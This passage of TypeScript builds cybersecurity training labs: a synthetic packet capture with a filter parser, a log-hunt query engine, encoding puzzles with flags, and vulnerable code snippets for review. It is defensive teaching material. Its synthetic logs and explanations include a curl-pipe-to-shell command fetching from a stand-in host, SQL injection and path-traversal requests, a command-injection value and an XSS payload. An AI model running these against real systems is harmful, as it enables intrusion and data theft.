// CyberHub challenge labs: Packet Lab, Log Hunt, Crypto & Encoding Lab and Secure Code Review.
// All data is synthetic and generated here (reserved example IPs and domains), so every answer is
// checkable offline. Engines are exported for tests. Text only, no innerHTML.

/* ============================================================ Packet Lab */
export type Pkt = { no: number; t: number; src: string; dst: string; proto: string; sport?: number; dport?: number; flags?: string; len: number; info: string;
  dns?: string; host?: string; uri?: string; method?: string; ua?: string; ftp?: string };
const NAMES: Record<number, string> = { 21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'domain', 80: 'http', 110: 'pop3', 139: 'netbios', 143: 'imap', 443: 'https', 445: 'microsoft-ds', 3389: 'ms-wbt-server', 8080: 'http-alt' };
export function capture(): Pkt[] {
  const P: Omit<Pkt, 'no'>[] = []; let t = 0;
  const add = (p: Omit<Pkt, 'no' | 't' | 'len'> & { len?: number }) => { t += 0.013 + (P.length % 7) * 0.011; P.push({ len: 60, ...p, t: Math.round(t * 1000) / 1000 }); };
  const dnsq = (src: string, name: string, ans: string, type = 'A') => { add({ src, dst: '10.0.5.1', proto: 'DNS', sport: 50000 + P.length, dport: 53, len: 74, info: `Standard query ${type} ${name}`, dns: name });
    add({ src: '10.0.5.1', dst: src, proto: 'DNS', sport: 53, dport: 50000 + P.length - 1, len: 90, info: `Standard query response ${type} ${name} ${ans}`, dns: name }); };
  const tcp = (src: string, dst: string, sport: number, dport: number, flags: string, info = '') => add({ src, dst, proto: 'TCP', sport, dport, flags, info: info || `${sport} → ${dport} [${flags}]` });
  // Normal morning traffic
  add({ src: '10.0.5.23', dst: 'ff:ff:ff:ff:ff:ff', proto: 'ARP', len: 42, info: 'Who has 10.0.5.1? Tell 10.0.5.23' });
  add({ src: '10.0.5.1', dst: '10.0.5.23', proto: 'ARP', len: 42, info: '10.0.5.1 is at 00:1a:2b:3c:4d:01' });
  dnsq('10.0.5.23', 'updates.example.com', '192.0.2.10');
  tcp('10.0.5.23', '192.0.2.10', 51500, 443, 'SYN'); tcp('192.0.2.10', '10.0.5.23', 443, 51500, 'SYN,ACK'); tcp('10.0.5.23', '192.0.2.10', 51500, 443, 'ACK');
  add({ src: '10.0.5.23', dst: '192.0.2.10', proto: 'TLS', sport: 51500, dport: 443, len: 517, info: 'Client Hello (SNI=updates.example.com)' });
  add({ src: '192.0.2.10', dst: '10.0.5.23', proto: 'TLS', sport: 443, dport: 51500, len: 1400, info: 'Server Hello, Certificate' });
  // Outside port scan against the file server
  const open = [21, 22, 80, 445];
  for (const port of [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3389, 8080]) {
    tcp('203.0.113.66', '10.0.5.20', 40112, port, 'SYN', `40112 → ${port} (${NAMES[port]}) [SYN]`);
    tcp('10.0.5.20', '203.0.113.66', port, 40112, open.includes(port) ? 'SYN,ACK' : 'RST,ACK');
  }
  add({ src: '10.0.5.31', dst: '10.0.5.1', proto: 'ICMP', len: 98, info: 'Echo (ping) request' });
  add({ src: '10.0.5.1', dst: '10.0.5.31', proto: 'ICMP', len: 98, info: 'Echo (ping) reply' });
  // Cleartext FTP login from a backup script
  tcp('10.0.5.40', '10.0.5.20', 52011, 21, 'SYN'); tcp('10.0.5.20', '10.0.5.40', 21, 52011, 'SYN,ACK'); tcp('10.0.5.40', '10.0.5.20', 52011, 21, 'ACK');
  add({ src: '10.0.5.20', dst: '10.0.5.40', proto: 'FTP', sport: 21, dport: 52011, len: 86, info: 'Response: 220 Inland State file server ready', ftp: '220' });
  add({ src: '10.0.5.40', dst: '10.0.5.20', proto: 'FTP', sport: 52011, dport: 21, len: 72, info: 'Request: USER backup', ftp: 'USER' });
  add({ src: '10.0.5.20', dst: '10.0.5.40', proto: 'FTP', sport: 21, dport: 52011, len: 88, info: 'Response: 331 Password required for backup', ftp: '331' });
  add({ src: '10.0.5.40', dst: '10.0.5.20', proto: 'FTP', sport: 52011, dport: 21, len: 76, info: 'Request: PASS Winter2026', ftp: 'PASS' });
  add({ src: '10.0.5.20', dst: '10.0.5.40', proto: 'FTP', sport: 21, dport: 52011, len: 80, info: 'Response: 230 Login successful', ftp: '230' });
  add({ src: '10.0.5.40', dst: '10.0.5.20', proto: 'FTP', sport: 52011, dport: 21, len: 84, info: 'Request: STOR nightly-db.tar.gz', ftp: 'STOR' });
  // Phishing download over plain HTTP
  dnsq('10.0.5.31', 'invoice-portal.example.net', '198.51.100.77');
  tcp('10.0.5.31', '198.51.100.77', 53344, 80, 'SYN'); tcp('198.51.100.77', '10.0.5.31', 80, 53344, 'SYN,ACK'); tcp('10.0.5.31', '198.51.100.77', 53344, 80, 'ACK');
  add({ src: '10.0.5.31', dst: '198.51.100.77', proto: 'HTTP', sport: 53344, dport: 80, len: 412, info: 'GET /billing/invoice_2026.exe HTTP/1.1', method: 'GET', uri: '/billing/invoice_2026.exe', host: 'invoice-portal.example.net', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' });
  add({ src: '198.51.100.77', dst: '10.0.5.31', proto: 'HTTP', sport: 80, dport: 53344, len: 1514, info: 'HTTP/1.1 200 OK (application/x-msdownload)' });
  add({ src: '10.0.5.23', dst: '192.0.2.10', proto: 'TLS', sport: 51500, dport: 443, len: 310, info: 'Application Data' });
  // DNS tunneling: long encoded labels to one domain
  for (const label of ['aGVsbG8gZnJvbSBzZXJ2ZXIx', 'dXNlcm5hbWVzLmNzdi5wYXJ0MQ', 'cGFydDIuYmFja3VwLWtleXM', 'ZW5kLW9mLXRyYW5zZmVy'])
    dnsq('10.0.5.52', `${label}.t1.cdn-sync.example.org`, '0.0.0.0', 'TXT');
  // Internal ARP sweep from a rogue device
  for (let h = 2; h <= 14; h++) add({ src: '10.0.5.99', dst: 'ff:ff:ff:ff:ff:ff', proto: 'ARP', len: 42, info: `Who has 10.0.5.${h}? Tell 10.0.5.99` });
  dnsq('10.0.5.44', 'portal.csusb.example.edu', '192.0.2.44');
  add({ src: '10.0.5.44', dst: '192.0.2.44', proto: 'TLS', sport: 54100, dport: 443, len: 517, info: 'Client Hello (SNI=portal.csusb.example.edu)' });
  return P.map((p, i) => ({ ...p, no: i + 1 }));
}

type Tok = { k: 'op' | 'word' | 'str' | 'lp' | 'rp' | 'and' | 'or' | 'not'; v: string };
function lex(s: string): Tok[] {
  const out: Tok[] = []; let i = 0;
  while (i < s.length) {
    const c = s[i];
    if (/\s/.test(c)) { i++; continue; }
    if (c === '(') { out.push({ k: 'lp', v: c }); i++; continue; }
    if (c === ')') { out.push({ k: 'rp', v: c }); i++; continue; }
    if (s.startsWith('&&', i)) { out.push({ k: 'and', v: '&&' }); i += 2; continue; }
    if (s.startsWith('||', i)) { out.push({ k: 'or', v: '||' }); i += 2; continue; }
    const op = ['==', '!=', '>=', '<=', '>', '<'].find(o => s.startsWith(o, i));
    if (op) { out.push({ k: 'op', v: op }); i += op.length; continue; }
    if (c === '!') { out.push({ k: 'not', v: '!' }); i++; continue; }
    if (c === '"' || c === "'") { const j = s.indexOf(c, i + 1); if (j < 0) throw new Error('Missing closing quote'); out.push({ k: 'str', v: s.slice(i + 1, j) }); i = j + 1; continue; }
    const m = /^[A-Za-z0-9_.:\-\/]+/.exec(s.slice(i)); if (!m) throw new Error(`Unexpected "${c}"`);
    const w = m[0], lw = w.toLowerCase();
    if (lw === 'and') out.push({ k: 'and', v: w }); else if (lw === 'or') out.push({ k: 'or', v: w }); else if (lw === 'not') out.push({ k: 'not', v: w });
    else if (lw === 'contains' || lw === 'eq' || lw === 'ne') out.push({ k: 'op', v: lw === 'eq' ? '==' : lw === 'ne' ? '!=' : 'contains' });
    else out.push({ k: 'word', v: w });
    i += w.length;
  }
  return out;
}
const PROTOS = ['arp', 'dns', 'tcp', 'udp', 'http', 'tls', 'icmp', 'ftp'];
function field(p: Pkt, f: string): (string | number)[] | null {
  const ports = (which: 's' | 'd' | 'both') => [which !== 'd' ? p.sport : undefined, which !== 's' ? p.dport : undefined].filter((x): x is number => x !== undefined);
  const isTcp = ['TCP', 'HTTP', 'TLS', 'FTP'].includes(p.proto), isUdp = p.proto === 'DNS';
  const fl = (n: string) => [p.flags ? (p.flags.split(',').includes(n) ? 1 : 0) : 0];
  switch (f) {
    case 'ip.addr': return p.proto === 'ARP' ? [] : [p.src, p.dst];
    case 'ip.src': return p.proto === 'ARP' ? [] : [p.src];
    case 'ip.dst': return p.proto === 'ARP' ? [] : [p.dst];
    case 'arp.src.proto_ipv4': return p.proto === 'ARP' ? [p.src] : [];
    case 'tcp.port': return isTcp ? ports('both') : [];
    case 'tcp.srcport': return isTcp ? ports('s') : [];
    case 'tcp.dstport': return isTcp ? ports('d') : [];
    case 'udp.port': return isUdp ? ports('both') : [];
    case 'port': return ports('both');
    case 'tcp.flags.syn': return isTcp ? fl('SYN') : [];
    case 'tcp.flags.ack': return isTcp ? fl('ACK') : [];
    case 'tcp.flags.reset': return isTcp ? fl('RST') : [];
    case 'dns.qry.name': return p.dns ? [p.dns] : [];
    case 'http.host': return p.host ? [p.host] : [];
    case 'http.request.uri': return p.uri ? [p.uri] : [];
    case 'http.request.method': return p.method ? [p.method] : [];
    case 'http.user_agent': return p.ua ? [p.ua] : [];
    case 'ftp.request.command': return p.ftp && /^[A-Z]+$/.test(p.ftp) ? [p.ftp] : [];
    case 'frame.len': return [p.len];
    case 'frame': case 'info': return [`${p.src} ${p.dst} ${p.proto} ${p.info} ${p.dns || ''} ${p.host || ''} ${p.uri || ''} ${p.ua || ''}`];
    default: return null;
  }
}
export function compileFilter(src: string): (p: Pkt) => boolean {
  const toks = lex(src.trim()); let i = 0;
  if (!toks.length) return () => true;
  const peek = () => toks[i]; const eat = (k: Tok['k']) => { const t = toks[i]; if (!t || t.k !== k) throw new Error(t ? `Unexpected "${t.v}"` : 'Filter ends too early'); i++; return t; };
  function expr(): (p: Pkt) => boolean { let l = conj(); while (peek()?.k === 'or') { i++; const a = l, b = conj(); l = p => a(p) || b(p); } return l; }
  function conj(): (p: Pkt) => boolean { let l = unary(); while (peek()?.k === 'and') { i++; const a = l, b = unary(); l = p => a(p) && b(p); } return l; }
  function unary(): (p: Pkt) => boolean {
    if (peek()?.k === 'not') { i++; const a = unary(); return p => !a(p); }
    if (peek()?.k === 'lp') { i++; const a = expr(); eat('rp'); return a; }
    const w = eat('word').v.toLowerCase();
    if (peek()?.k !== 'op') {
      if (PROTOS.includes(w)) return p => p.proto.toLowerCase() === w || (w === 'tcp' && ['HTTP', 'TLS', 'FTP'].includes(p.proto)) || (w === 'udp' && p.proto === 'DNS');
      if (w === 'http.request') return p => !!p.method;
      if (field({ no: 0, t: 0, src: '', dst: '', proto: 'TCP', len: 0, info: '' }, w) !== null) return p => (field(p, w) || []).length > 0;
      throw new Error(`Unknown field or protocol "${w}"`);
    }
    const op = eat('op').v; const vt = peek(); if (!vt || (vt.k !== 'word' && vt.k !== 'str')) throw new Error('Missing a value after ' + op); i++;
    const val = vt.v; if (field({ no: 0, t: 0, src: '', dst: '', proto: 'TCP', len: 0, info: '' }, w) === null) throw new Error(`Unknown field "${w}"`);
    return p => {
      const vs = field(p, w) || [];
      return vs.some(x => {
        if (op === 'contains') return String(x).toLowerCase().includes(val.toLowerCase());
        const n = Number(val), isNum = typeof x === 'number' && !Number.isNaN(n);
        const a = isNum ? x as number : String(x).toLowerCase(), b = isNum ? n : val.toLowerCase();
        return op === '==' ? a === b : op === '!=' ? a !== b : op === '>' ? a > b : op === '<' ? a < b : op === '>=' ? a >= b : a <= b;
      });
    };
  }
  const f = expr(); if (i < toks.length) throw new Error(`Unexpected "${toks[i].v}"`);
  return f;
}

/* ============================================================ Log Hunt */
export type Ev = { time: string; source: 'auth' | 'web'; host: string; src_ip: string; user?: string; action?: string; cmd?: string; method?: string; path?: string; status?: number; ua?: string; raw: string };
export function events(): Ev[] {
  const E: Ev[] = []; let m = 0;
  const ts = (h: number, mi: number, s: number) => `2026-10-21T${String(h).padStart(2, '0')}:${String(mi).padStart(2, '0')}:${String(s).padStart(2, '0')}Z`;
  const auth = (time: string, src_ip: string, user: string, action: string, extra = '') => E.push({ time, source: 'auth', host: 'web01', src_ip, user, action, raw: `${time} web01 sshd: ${action === 'failed' ? 'Failed password' : 'Accepted password'} for ${user} from ${src_ip}${extra}` });
  const web = (time: string, src_ip: string, method: string, path: string, status: number, ua: string) => E.push({ time, source: 'web', host: 'web01', src_ip, method, path, status, ua, raw: `${src_ip} - - [${time}] "${method} ${path} HTTP/1.1" ${status} "${ua}"` });
  const browsers = ['Mozilla/5.0 (Windows NT 10.0) Chrome/130.0', 'Mozilla/5.0 (Macintosh) Safari/18.0', 'Mozilla/5.0 (iPhone) Mobile Safari/18.0'];
  // Normal staff activity
  auth(ts(7, 58, 12), '10.0.5.23', 'mlopez', 'accepted'); auth(ts(8, 4, 40), '10.0.5.31', 'jchen', 'accepted');
  for (const [p, st] of [['/', 200], ['/courses', 200], ['/login', 200], ['/dashboard', 200], ['/static/app.js', 200], ['/favicon.ico', 404]] as [string, number][])
    for (let k = 0; k < 3; k++) web(ts(8, 10 + (m++ % 40), 5 + k * 7), `10.0.5.${20 + k * 7}`, 'GET', p, st, browsers[k]);
  auth(ts(9, 2, 3), '10.0.5.31', 'jchen', 'failed'); auth(ts(9, 2, 9), '10.0.5.31', 'jchen', 'accepted');
  // SSH brute force from outside
  const users = ['root', 'admin', 'test', 'oracle', 'ubuntu', 'deploy'];
  for (let k = 0; k < 42; k++) auth(ts(10, 3 + Math.floor(k / 6), (k * 7) % 60), '203.0.113.66', users[k % users.length], 'failed');
  for (let k = 0; k < 5; k++) auth(ts(10, 20, k * 9), '198.51.100.23', 'root', 'failed');
  auth(ts(10, 11, 32), '203.0.113.66', 'deploy', 'accepted');
  E.push({ time: ts(10, 12, 5), source: 'auth', host: 'web01', src_ip: '203.0.113.66', user: 'deploy', action: 'sudo', cmd: '/bin/bash -c curl -s http://198.51.100.77/m.sh | sh', raw: `${ts(10, 12, 5)} web01 sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash -c curl -s http://198.51.100.77/m.sh | sh` });
  E.push({ time: ts(10, 12, 40), source: 'auth', host: 'web01', src_ip: '203.0.113.66', user: 'deploy', action: 'useradd', cmd: 'useradd -m -s /bin/bash sysupd', raw: `${ts(10, 12, 40)} web01 useradd[4412]: new user: name=sysupd, home=/home/sysupd, shell=/bin/bash` });
  // Web attacks
  const sqlmap = 'sqlmap/1.8.4#stable (https://sqlmap.org)';
  for (const [k, q] of ["1'", "1' OR '1'='1", '1 UNION SELECT NULL,NULL--', "1 AND SLEEP(5)--", '1;DROP TABLE x--'].entries()) web(ts(11, 2, k * 3), '192.0.2.150', 'GET', `/courses/view.php?id=${encodeURIComponent(q)}`, k === 2 || k === 4 ? 500 : 200, sqlmap);
  for (const [k, f] of ['../../etc/passwd', '..%2f..%2f..%2fetc%2fshadow', '....//....//config.php'].entries()) web(ts(11, 30, k * 11), '192.0.2.150', 'GET', `/download.php?file=${f}`, k === 0 ? 200 : 403, 'curl/8.5.0');
  web(ts(11, 45, 2), '10.0.5.44', 'POST', '/login', 302, browsers[0]); web(ts(11, 46, 7), '10.0.5.44', 'GET', '/reports/export', 500, browsers[0]);
  return E.sort((a, b) => a.time < b.time ? -1 : a.time > b.time ? 1 : 0);
}
const EVF = ['time', 'source', 'host', 'src_ip', 'user', 'action', 'cmd', 'method', 'path', 'status', 'ua'] as const;
export type QResult = { rows: Ev[]; table?: { cols: string[]; rows: (string | number)[][] }; count: number };
const like = (val: string, pat: string) => { const re = new RegExp('^' + pat.toLowerCase().split('*').map(x => x.replace(/[.+?^${}()|[\]\\]/g, '\\$&')).join('.*') + '$'); return re.test(val.toLowerCase()); };
export function runQuery(all: Ev[], q: string): QResult {
  const [search, ...pipes] = q.split('|').map(s => s.trim());
  const terms = search.match(/(?:[^\s"]+="[^"]*"|"[^"]*"|\S+)/g) || [];
  const tests: ((e: Ev) => boolean)[] = []; let neg = false;
  for (const raw of terms) {
    if (/^not$/i.test(raw)) { neg = true; continue; }
    const m = /^([a-z_]+)(!=|>=|<=|=|>|<)(.*)$/.exec(raw); let t: (e: Ev) => boolean;
    if (m) {
      const [, f, op, v0] = m; if (!(EVF as readonly string[]).includes(f)) throw new Error(`Unknown field "${f}". Fields: ${EVF.join(', ')}`);
      const v = v0.replace(/^"|"$/g, '');
      t = e => { const x = (e as unknown as Record<string, unknown>)[f]; if (x === undefined) return op === '!='; const s = String(x);
        if (op === '=' ) return like(s, v); if (op === '!=') return !like(s, v);
        const a = Number(x), b = Number(v); if (Number.isNaN(a) || Number.isNaN(b)) return false; return op === '>' ? a > b : op === '<' ? a < b : op === '>=' ? a >= b : a <= b; };
    } else { const w = raw.replace(/^"|"$/g, '').toLowerCase(); t = e => e.raw.toLowerCase().includes(w); }
    const n = neg; tests.push(n ? (e => !t(e)) : t); neg = false;
  }
  let rows = all.filter(e => tests.every(t => t(e))); let table: QResult['table'];
  for (const p of pipes) {
    let m: RegExpExecArray | null;
    if ((m = /^stats\s+count(?:\s+by\s+([a-z_]+))?$/i.exec(p))) {
      const f = m[1]; if (!f) { table = { cols: ['count'], rows: [[rows.length]] }; continue; }
      if (!(EVF as readonly string[]).includes(f)) throw new Error(`Unknown field "${f}"`);
      const c = new Map<string, number>(); for (const e of rows) { const k = String((e as unknown as Record<string, unknown>)[f] ?? '(none)'); c.set(k, (c.get(k) || 0) + 1); }
      table = { cols: [f, 'count'], rows: [...c.entries()].sort((a, b) => b[1] - a[1] || (a[0] < b[0] ? -1 : 1)) };
    } else if ((m = /^head\s+(\d+)$/i.exec(p))) { const n = Number(m[1]); if (table) table.rows = table.rows.slice(0, n); else rows = rows.slice(0, n); }
    else if ((m = /^tail\s+(\d+)$/i.exec(p))) { const n = Number(m[1]); if (table) table.rows = table.rows.slice(-n); else rows = rows.slice(-n); }
    else if ((m = /^table\s+([a-z_,\s]+)$/i.exec(p))) { const cols = m[1].split(/[,\s]+/).filter(Boolean); for (const c of cols) if (!(EVF as readonly string[]).includes(c)) throw new Error(`Unknown field "${c}"`); table = { cols, rows: rows.map(e => cols.map(c => String((e as unknown as Record<string, unknown>)[c] ?? ''))) }; }
    else if (p) throw new Error(`Unknown command "${p.split(/\s+/)[0]}". Try: stats count by FIELD, head N, tail N, table f1,f2`);
  }
  return { rows, table, count: rows.length };
}

/* ============================================================ Crypto & Encoding */
const b64e = (s: string) => btoa(unescape(encodeURIComponent(s)));
const b64d = (s: string) => decodeURIComponent(escape(atob(s.replace(/\s+/g, ''))));
const hexe = (s: string) => [...new TextEncoder().encode(s)].map(b => b.toString(16).padStart(2, '0')).join('');
const hexd = (s: string) => { const h = s.replace(/[^0-9a-f]/gi, ''); if (h.length % 2) throw new Error('Hex needs an even number of digits'); return new TextDecoder().decode(new Uint8Array(h.match(/../g)!.map(x => parseInt(x, 16)))); };
const shift = (s: string, n: number) => s.replace(/[a-z]/gi, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0) - b + n) % 26 + 26) % 26 + b); });
const xorHex = (s: string, k: number) => { const h = s.replace(/[^0-9a-f]/gi, ''); if (h.length % 2) throw new Error('Hex needs an even number of digits'); return String.fromCharCode(...h.match(/../g)!.map(x => parseInt(x, 16) ^ k)); };
export type Op = { id: string; name: string; param?: string; run: (s: string, p: number) => string };
export const OPS: Op[] = [
  { id: 'fromb64', name: 'From Base64', run: s => b64d(s) }, { id: 'tob64', name: 'To Base64', run: s => b64e(s) },
  { id: 'fromhex', name: 'From Hex', run: s => hexd(s) }, { id: 'tohex', name: 'To Hex', run: s => hexe(s) },
  { id: 'rot13', name: 'ROT13', run: s => shift(s, 13) }, { id: 'caesar', name: 'Caesar shift', param: 'Shift by', run: (s, n) => shift(s, n) },
  { id: 'urld', name: 'URL decode', run: s => decodeURIComponent(s) }, { id: 'rev', name: 'Reverse', run: s => [...s].reverse().join('') },
  { id: 'xor', name: 'XOR (hex in)', param: 'Key (0-255)', run: (s, n) => xorHex(s, n) },
  { id: 'frombin', name: 'From Binary', run: s => (s.match(/[01]{8}/g) || []).map(b => String.fromCharCode(parseInt(b, 2))).join('') },
];
export function applyRecipe(input: string, recipe: { id: string; p: number }[]): string {
  let s = input;
  recipe.forEach((r, i) => { const op = OPS.find(o => o.id === r.id); if (!op) throw new Error('Unknown step');
    try { s = op.run(s, r.p); } catch { throw new Error(`step ${i + 1} (${op.name}) could not read its input. It is probably not in that format yet: check the order of your recipe`); } });
  return s;
}
export async function sha256(s: string): Promise<string> { const d = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s)); return [...new Uint8Array(d)].map(b => b.toString(16).padStart(2, '0')).join(''); }
const xorEnc = (s: string, k: number) => [...s].map(c => (c.charCodeAt(0) ^ k).toString(16).padStart(2, '0')).join(' ');
export const CRYPTO = [
  { id: 'b64', title: 'Base64', input: b64e('CISO{base64_is_not_encryption}'), q: 'Decode the message. What is the flag?', a: 'CISO{base64_is_not_encryption}', hints: ['Strings of letters, numbers, + and / that often end in = are usually Base64.', 'Add "From Base64" to the recipe.'], lesson: 'Base64 is an encoding, not encryption: anyone can reverse it, no key needed. You will see it in emails, web tokens and malware.' },
  { id: 'hex', title: 'Hex', input: hexe('CISO{hex_is_just_bytes}'), q: 'Decode the message. What is the flag?', a: 'CISO{hex_is_just_bytes}', hints: ['Only the digits 0-9 and letters a-f: that is hexadecimal.', 'Add "From Hex".'], lesson: 'Hex writes each byte as two digits. Packet dumps, hashes and memory views all use it.' },
  { id: 'rot13', title: 'ROT13', input: shift('CISO{rot13_for_the_win}', 13), q: 'This looks like the flag format, but scrambled. What is the flag?', a: 'CISO{rot13_for_the_win}', hints: ['The braces and underscores survived, only letters changed. A letter-shift cipher?', 'Try ROT13: it rotates each letter 13 places.'], lesson: 'ROT13 and other shift ciphers keep the shape of text. They hide nothing from anyone who tries.' },
  { id: 'caesar', title: 'Caesar', input: shift('CISO{caesar_shifted_by_three}', 3), q: 'Each letter was shifted forward a few places. What is the flag?', a: 'CISO{caesar_shifted_by_three}', hints: ['The flag always starts CISO. Compare C with the first letter here.', 'C became F, so shift back by 3: use Caesar shift with -3 (or 23).'], lesson: 'A Caesar cipher has only 25 possible keys, so a computer tries them all instantly. Known text, like a flag prefix, gives the key away too.' },
  { id: 'url', title: 'URL encoding', input: encodeURIComponent('CISO{url_encoding_hides_nothing}').replace(/_/g, '%5F'), q: 'Seen in a web server log. What is the flag?', a: 'CISO{url_encoding_hides_nothing}', hints: ['%7B and %7D are percent-encoded characters.', 'Add "URL decode".'], lesson: 'Attackers percent-encode payloads to slip past naive filters, like the ..%2f path traversal in the Log Hunt. Decode before you judge.' },
  { id: 'layers', title: 'Layers', input: b64e(hexe(shift('CISO{layers_on_layers}', 13))), q: 'Malware authors stack encodings. Peel all three layers. What is the flag?', a: 'CISO{layers_on_layers}', hints: ['Start with the outside layer: it looks like Base64.', 'After Base64 you get hex. After hex, the letters are still scrambled.', 'Recipe: From Base64 → From Hex → ROT13.'], lesson: 'Stacked encodings are common in malicious scripts. Peel one layer at a time and check the output after each step.' },
  { id: 'xor', title: 'XOR', input: xorEnc('CISO{xor_needs_a_secret_key}', 42), q: 'These bytes were XORed with a single-byte key. The key is 42. What is the flag?', a: 'CISO{xor_needs_a_secret_key}', hints: ['Add "XOR (hex in)" and set the key.', 'Key = 42.'], lesson: 'XOR with a short, reused key is weak: knowing part of the plaintext reveals the key. Real encryption uses vetted algorithms like AES with random keys.' },
  { id: 'bin', title: 'Binary', input: [...'CISO{eight_bits_per_byte}'].map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '), q: 'Decode the binary. What is the flag?', a: 'CISO{eight_bits_per_byte}', hints: ['Groups of eight 0s and 1s are bytes.', 'Add "From Binary".'], lesson: 'Every encoding here is just a different way of writing the same bytes.' },
  { id: 'hash', title: 'Hashing', input: 'CISO CyberHub', q: 'A hash is a fingerprint. Press "SHA-256 the input" and enter the first 8 characters of the hash.', a: '', hints: ['Use the "SHA-256 the input" button below the recipe, with the input unchanged.', 'Enter only the first 8 hex characters.'], lesson: 'Change one character and the hash changes completely. That is how you verify a download: compare its hash with the one the vendor published separately.' },
];

/* ============================================================ Secure Code Review */
export type Snip = { id: string; title: string; lang: string; code: string[]; bad: number; fixes: string[]; fix: number; why: string; cwe: string };
export const REVIEW: Snip[] = [
  { id: 'sqli', title: 'Student lookup', lang: 'Python', cwe: 'CWE-89 SQL injection', bad: 5, fix: 1,
    code: ['@app.get("/students")', 'def find_student():', '    name = request.args.get("name", "")', '    cur = db.cursor()', '    cur.execute(f"SELECT * FROM students WHERE name = \'{name}\'")', '    return jsonify(cur.fetchall())'],
    fixes: ['Escape single quotes with name.replace("\'", "")', 'cur.execute("SELECT * FROM students WHERE name = %s", (name,))', 'Check that name is shorter than 50 characters'],
    why: 'User input is pasted into the SQL text, so input like \' OR \'1\'=\'1 changes the query. Parameterized queries send data separately from code. Stripping quotes is easy to bypass.' },
  { id: 'xss', title: 'Greeting page', lang: 'JavaScript', cwe: 'CWE-79 Cross-site scripting', bad: 3, fix: 2,
    code: ['app.get("/hello", (req, res) => {', '  const name = req.query.name || "friend";', '  res.send(`<h1>Hello ${name}</h1>`);', '});'],
    fixes: ['Block requests that contain the word "script"', 'Set a cookie with HttpOnly', 'Escape name for HTML (or render with a template engine that auto-escapes)'],
    why: 'A name like <img src=x onerror=alert(1)> runs in the visitor\'s browser. Encode output for the context it lands in. Word blocklists miss endless variants.' },
  { id: 'path', title: 'File download', lang: 'Python', cwe: 'CWE-22 Path traversal', bad: 4, fix: 0,
    code: ['@app.get("/download")', 'def download():', '    name = request.args["file"]', '    return send_file(os.path.join("/srv/uploads", name))'],
    fixes: ['Resolve the full path and refuse it unless it is still inside /srv/uploads', 'Make the uploads folder read-only', 'Log the file name before sending'],
    why: 'file=../../etc/passwd walks out of the folder. Canonicalize the path and check it stays inside the allowed directory (or look files up by ID).' },
  { id: 'cmd', title: 'Network check', lang: 'Python', cwe: 'CWE-78 OS command injection', bad: 3, fix: 2,
    code: ['def ping(host):', '    # host comes from a web form', '    out = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)', '    return out.stdout'],
    fixes: ['Run it with sudo so it always works', 'Remove spaces from host', 'Validate host as an IP or hostname, then subprocess.run(["ping", "-c", "1", host]) without shell=True'],
    why: 'host = "8.8.8.8; cat /etc/passwd" runs a second command. Pass an argument list without a shell, and validate the input.' },
  { id: 'secret', title: 'Cloud upload', lang: 'Python', cwe: 'CWE-798 Hard-coded credentials', bad: 3, fix: 1,
    code: ['import boto3', '', 'AWS_SECRET_ACCESS_KEY = "EXAMPLEKEY/K7MDENG/bPxRfiCYEXAMPLE"', 's3 = boto3.client("s3", aws_secret_access_key=AWS_SECRET_ACCESS_KEY)', 's3.upload_file("grades.csv", "isu-reports", "grades.csv")'],
    fixes: ['Base64-encode the key in the file', 'Use the workload\'s IAM role or a secrets manager; never commit keys. Rotate this one now.', 'Move the key into a file called config.py'],
    why: 'Anything in a repo is effectively public and lives on in git history. Encoding is not protection. Rotate leaked keys and use short-lived, role-based credentials.' },
  { id: 'hash', title: 'Sign-up', lang: 'Python', cwe: 'CWE-916 Weak password hashing', bad: 3, fix: 0,
    code: ['def register(email, password):', '    user = User(email=email)', '    user.pw = hashlib.md5(password.encode()).hexdigest()', '    db.save(user)'],
    fixes: ['Use a slow, salted password hash such as Argon2id or bcrypt', 'Use SHA-256 instead of MD5', 'Encrypt the password with AES and store the key nearby'],
    why: 'MD5 and even SHA-256 are fast, so stolen hashes are cracked by billions of guesses per second. Password hashes must be slow and salted. Encryption is reversible, which is worse.' },
  { id: 'idor', title: 'Invoice view', lang: 'JavaScript', cwe: 'CWE-639 Insecure direct object reference', bad: 3, fix: 2,
    code: ['app.get("/invoices/:id", requireLogin, async (req, res) => {', '  const invoice = await Invoice.findById(req.params.id);', '  res.json(invoice);', '});'],
    fixes: ['Use long random IDs so nobody can guess them', 'Return 404 instead of 403 for missing invoices', 'Only return the invoice if invoice.ownerId === req.user.id (or the user is staff)'],
    why: 'Being logged in is not the same as being allowed. Change id=1001 to 1002 and you see someone else\'s invoice. Check ownership on every request; random IDs only hide the bug.' },
  { id: 'pickle', title: 'Session restore', lang: 'Python', cwe: 'CWE-502 Unsafe deserialization', bad: 3, fix: 1,
    code: ['@app.post("/restore")', 'def restore():', '    state = pickle.loads(request.data)', '    session.update(state)', '    return "ok"'],
    fixes: ['Compress the data first', 'Accept JSON with json.loads and validate the fields you expect', 'Only accept requests under 1 KB'],
    why: 'pickle can run code while loading, so attacker-supplied pickle is remote code execution. Use plain data formats with a schema.' },
  { id: 'redirect', title: 'Login redirect', lang: 'Python', cwe: 'CWE-601 Open redirect', bad: 5, fix: 0,
    code: ['@app.post("/login")', 'def login():', '    if check(request.form):', '        nxt = request.args.get("next", "/")', '        return redirect(nxt)', '    return render("login.html", error=True)'],
    fixes: ['Only redirect to relative paths on this site (or an allow-list); otherwise go to "/"', 'Add a 2-second delay before redirecting', 'Require HTTPS for the next parameter'],
    why: 'A phishing link like /login?next=https://evil.example sends users from your real login page to an attacker\'s site.' },
  { id: 'jwt', title: 'API token check', lang: 'Python', cwe: 'CWE-347 Missing signature verification', bad: 3, fix: 2,
    code: ['def current_user(token):', '    # token from the Authorization header', '    claims = jwt.decode(token, options={"verify_signature": False})', '    return User.get(claims["sub"])'],
    fixes: ['Check that the token has three parts', 'Store the token in localStorage', 'jwt.decode(token, KEY, algorithms=["HS256"]) so forged tokens are rejected'],
    why: 'Without verifying the signature, anyone can write their own token and claim to be any user. Verify with the key and pin the algorithm.' },
  { id: 'iam', title: 'Cloud IAM policy', lang: 'JSON', cwe: 'Least privilege (cloud misconfiguration)', bad: 5, fix: 1,
